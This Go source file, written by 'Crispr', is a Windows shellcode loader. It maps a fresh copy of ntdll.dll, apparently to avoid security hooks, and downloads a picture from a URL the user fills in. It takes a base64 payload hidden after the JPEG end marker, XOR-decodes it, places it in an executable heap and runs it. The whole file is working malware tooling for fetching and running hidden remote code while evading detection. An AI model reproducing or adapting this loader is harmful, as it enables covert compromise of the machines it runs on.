// Author:Crispr
// Data:2021.9.20
package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"
	"github.com/Binject/universal"
)

var (
	kernel32   = syscall.MustLoadDLL("kernel32.dll")
	HeapCreate = kernel32.MustFindProc("HeapCreate")
)

const (
	KEY_1 = 22
	KEY_2 = 44
	MEM_COMMIT                 = 0x1000
	MEM_RESERVE                = 0x2000
	PAGE_EXECUTE_READWRITE     = 0x40 
	HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
)

func main() {
	var ntdll_image []byte

	var err error
	ntdll_image, err = ioutil.ReadFile("C:\\Windows\\System32\\ntdll.dll")

	ntdll_loader, err := universal.NewLoader()

	if err != nil {
		log.Fatal(err)
	}

	ntdll_library, err := ntdll_loader.LoadLibrary("main", &ntdll_image)

	if err != nil {
		log.Fatal(err)
	}

	imageUrl := ""//需要填写图片马的地址
	res, err := http.Get(imageUrl)
	if err != nil {
		os.Exit(0)
	}
	body, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	//下面判断Jpeg结尾的ffd9
	idx := 0
	for i := 0; i < len(body); i++ {
		if body[idx] == 255 && body[idx+1] == 217 {
			break
		} else if idx == len(body)-1 {
			fmt.Print("shell png is not correct!")
			os.Exit(1)
		}
		idx++
	}
	base64Str := string(body[idx+2:])
	//fmt.Print(base64Str)
	xor_shellcode, err := base64.StdEncoding.DecodeString(base64Str)
	if err != nil {
		fmt.Print(err.Error())
	}
	//fmt.Print(xor_shellcode)
	var shellcode []byte
	for i := 0; i < len(xor_shellcode); i++ {
		shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
	}
	//开始分配空间 并且将shellcode写入内存中执行
	addr, _, err := HeapCreate.Call(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)

	_, err = ntdll_library.Call("RtlCopyMemory", addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		fmt.Printf("false")
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
